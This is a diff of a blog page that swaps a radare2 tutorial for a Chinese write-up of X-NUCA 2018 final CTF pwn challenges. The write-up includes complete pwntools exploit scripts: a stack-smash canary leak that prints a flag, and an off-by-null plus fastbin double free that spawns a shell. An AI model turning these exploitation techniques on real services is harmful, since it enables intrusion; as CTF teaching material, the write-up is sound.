@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>CTF二进制总结0x02 · mozhucy&#39;s blog</title>
+    <title>X-NUCA 2018个人赛/决赛PWN · mozhucy&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">mozhucy&#39;s blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">CTF二进制总结0x02</a>
+                <a href="#" class="post-name">X-NUCA 2018个人赛/决赛PWN</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            CTF二进制总结0x02
+            X-NUCA 2018个人赛/决赛PWN
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">573</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">784</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/21</span>
+                    <span class="post-intro-time">2019/01/22</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,29 +395,40 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>ELF文件的动态调试，IDA远程动态调试GG，kali自带OD GG，edb-debug鸡肋的功能，来一发radare2好了。上午刚被gdb搞得头大，现在来挑战一下更难的r2。<br><br>首先，radare是一款类似于IDA的工具，他也有可视化图形界面，但是却是基于命令行之上的。先来一发Hello World调试一下。<br><br>gcc hello.c -o hello后，打开终端<br></p>
-<blockquote>
-<p>r2 ./hello<br><br>[0x00000530]&gt;</p>
-</blockquote>
-<p>变成了这个样子，这时输入ie，你会得到</p>
-<blockquote>
-<p>[Entrypoints]<br>vaddr=0x00000530 paddr=0x00000530 baddr=0x00000000 laddr=0x00000000 haddr=0x00000018 type=program<br><br><br>1 entrypoints</p>
-</blockquote>
-<p>这里的ie，即info entrypoints，在r2中，i?指令是很常用的，具体如下：<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[0x00000000]&gt; i?</span><br><span class="line">|Usage: i Get info from opened file (see rabin2&apos;s manpage)</span><br><span class="line">| Output mode:       </span><br><span class="line">| &apos;*&apos;                Output in radare commands</span><br><span class="line">| &apos;j&apos;                Output in json</span><br><span class="line">| &apos;q&apos;                Simple quiet output</span><br><span class="line">| Actions:           </span><br><span class="line">| i|ij               Show info of current file (in JSON)</span><br><span class="line">| iA                 List archs</span><br><span class="line">| ia                 Show all info (imports, exports, sections..)</span><br><span class="line">| ib                 Reload the current buffer for setting of the bin (use once only)</span><br><span class="line">| ic                 List classes, methods and fields</span><br><span class="line">| iC                 Show signature info (entitlements, ...)</span><br><span class="line">| id[?]              Debug information (source lines)</span><br><span class="line">| iD lang sym        demangle symbolname for given language</span><br><span class="line">| ie                 Entrypoint</span><br><span class="line">| iE                 Exports (global symbols)</span><br><span class="line">| ih                 Headers (alias for iH)</span><br><span class="line">| iHH                Verbose Headers in raw text</span><br><span class="line">| ii                 Imports</span><br><span class="line">| iI                 Binary info</span><br><span class="line">| ik [query]         Key-value database from RBinObject</span><br><span class="line">| il                 Libraries</span><br><span class="line">| iL [plugin]        List all RBin plugins loaded or plugin details</span><br><span class="line">| im                 Show info about predefined memory allocation</span><br><span class="line">| iM                 Show main address</span><br><span class="line">| io [file]          Load info from file (or last opened) use bin.baddr</span><br><span class="line">| ir                 Relocs</span><br><span class="line">| iR                 Resources</span><br><span class="line">| is                 Symbols</span><br><span class="line">| iS [entropy,sha1]  Sections (choose which hash algorithm to use)</span><br><span class="line">| iV                 Display file version info</span><br><span class="line">| iz|izj             Strings in data sections (in JSON/Base64)</span><br><span class="line">| izz                Search for Strings in the whole binary</span><br><span class="line">| iZ                 Guess size of binary program</span><br></pre></td></tr></table></figure></p>
-<p>r2不会自动分析文件，刚开始用r2时…疯狂输入pdf，但是并没有什么效果啊，百度了一下才发现，需要analyse。这时可以输入aa或者aaa，其中aaa适合分析比较小的文件。这里选择了aaa。</p>
-<blockquote>
-<p>[0x00000530]&gt; aaa<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[x] Analyze len bytes of instructions for references (aar)<br>[x] Analyze function calls (aac)<br>[ ] [*] Use -AA or aaaa to perform additional experimental analysis.<br>[x] Constructing a function name for fcn.* and sym.func.* functions (aan))</p>
-</blockquote>
-<p>在分析中，还可以用到s 0x00xxxxxx 用来跳到目标地址，还可以用px wx来进行修改汇编指令，还有汇编语言$ rasm2 -a x86 -b 64 “jmp 0x00xxx”转机器码。eval cfg.write=true 或 r2 -w hello来使文件可写，px 20 wx等操作来写入修改后的字节码。有时间做一道题目试试看吧。</p>
+        <p>终于熬过考试周了…重装电脑加上配虚拟机博客环境前后花了快两天.寒假整理一下以前的题目吧,先是12月初的XNUCA总决赛和铁三总决赛.</p>
+<h1 id="个人赛"><a href="#个人赛" class="headerlink" title="个人赛"></a>个人赛</h1><h2 id="PWN0-18solve"><a href="#PWN0-18solve" class="headerlink" title="PWN0(18solve)"></a>PWN0(18solve)</h2><ul>
+<li>个人赛签到题,一个gets栈溢出,有canary,只有一次输入机会,显然不是ROP的打法,flag在内存中,先让我们输入小于flag长度的任意字符,输入回车结束</li>
+<li>这里利用stack smash,当canary存在时,如果发生栈溢出,程序会执行如下代码:</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>因为flag在内存中,所以我们可以算出输入点和__libc_argv[0],也就是程序名称的偏移,填充后写入一根指针,利用报错信息打印flag,由于内存映射机制,所以程序中有时候会存在两个flag</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./catch_me"</span>)</span><br><span class="line"><span class="comment"># for i in range(24):</span></span><br><span class="line">r = remote(<span class="string">"172.19.8.82"</span>,<span class="number">9999</span>)</span><br><span class="line">r.recvuntil(<span class="string">"flag:"</span>)</span><br><span class="line">r.sendline(<span class="string">""</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x7fffffffdf38</span> - <span class="number">0x7fffffffde10</span>) + p64(<span class="number">0x600CA0</span>)</span><br><span class="line">r.recvuntil(<span class="string">"sure?"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">flag = r.recv(<span class="number">32</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当时因为是给了一台内网的机器,没有pwntools,最后用的socket写的脚本,后来才知道有一个单文件库zio可以直接复制进去用.</li>
+<li>然后并没有给pwn题的服务器和端口,最后只能用nmap扫描端口逐一nc来确定题目XD</li>
+</ul>
+<h2 id="PWN1-10solve"><a href="#PWN1-10solve" class="headerlink" title="PWN1(10solve)"></a>PWN1(10solve)</h2><ul>
+<li>这就是一个堆题了,记得当时有几个师傅做的也非常快</li>
+<li>扫一遍功能switch,发现有两个后门!输入1234和输入2333的时候会分别出发,1234就是一个malloc(0x20)然后向里面和bss段分别读入0x20,2333则是system(command),很明显这是要修改command为/bin/sh</li>
+<li>分别查看几个基础功能函数,发现在new时,存在一个<code>scanf(&quot;%32s&quot;,ptr)</code>,也就是这里存在了一个off-by-null,scanf函数自动补的0使得当输入恰好为32位的时候,会有33位被赋值.</li>
+<li>后面的功能函数则是才用了read函数,不存在溢出,在free处,也有对应的inuse数组作为防止double-free的保护,整理结构体发现</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> content[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> * nameptr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>也就是content刚好可以盖到nameptr指针,使得低位变成0,加上后门1234的偏移刚好可以获得指向相同堆块的指针,一发double解决,还要注意的是fastbin的验证条件.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./note"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    r.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,content)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sa(<span class="string">"name:"</span>,name)</span><br><span class="line">    sa(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,name,content)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sa(<span class="string">"edit\n"</span>,str(index))</span><br><span class="line">    sa(<span class="string">"name:\n"</span>,name)</span><br><span class="line">    sa(<span class="string">"content:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">    sa(<span class="string">"view"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"4"</span>)</span><br><span class="line">    sa(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor1</span><span class="params">(name,content)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"1234"</span>)</span><br><span class="line">    sa(<span class="string">"name:"</span>,name)</span><br><span class="line">    sa(<span class="string">"content:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"2333"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    backdoor1(<span class="string">"backdoor"</span>,<span class="string">"flagflag"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"0"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"1"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"2"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"3"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"4"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"5"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"6"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"7"</span>*<span class="number">0x20</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    </span><br><span class="line">    add(p64(<span class="number">0x602090</span><span class="number">-0x8</span>),<span class="string">"fff"</span>)</span><br><span class="line">    add(<span class="string">"lll"</span>,<span class="string">"lll"</span>)</span><br><span class="line">    add(<span class="string">"aaa"</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="string">"/bin/sh\x00"</span>,<span class="string">"ggg"</span>)</span><br><span class="line">    getshell()</span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="comment">#add("name","/bin/sh\x00")</span></span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sa(<span class="string">"Please leave your name :"</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">mozhucy</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2018/08/21/radare2/">http://yoursite.com/2018/08/21/radare2/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2018/08/21/radare2/">August 21st 2018, 10:15:53 pm</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2018/08/21/radare2/">August 21st 2018, 10:15:53 pm</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/01/22/xnuca-final/">http://yoursite.com/2019/01/22/xnuca-final/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/01/22/xnuca-final/">January 22nd 2019, 9:02:06 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/01/22/xnuca-final/">January 22nd 2019, 11:23:36 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -425,17 +436,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2018/08/21/WHCTF2017 逆向签到题/" title="CTF二进制总结0x01">
-                    <div class="nextTitle">CTF二进制总结0x01</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2018/08/19/qctf-asong/" title="qctf-asong">
-                    <div class="prevTitle">qctf-asong</div>
+                <a href="/2018/12/02/byb/" title="百越杯逆向全解wp">
+                    <div class="prevTitle">百越杯逆向全解wp</div>
                 </a>
             
         </li>
@@ -547,7 +553,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#个人赛"><span class="toc-number">1.</span> <span class="toc-text">个人赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN0-18solve"><span class="toc-number">1.1.</span> <span class="toc-text">PWN0(18solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN1-10solve"><span class="toc-number">1.2.</span> <span class="toc-text">PWN1(10solve)</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
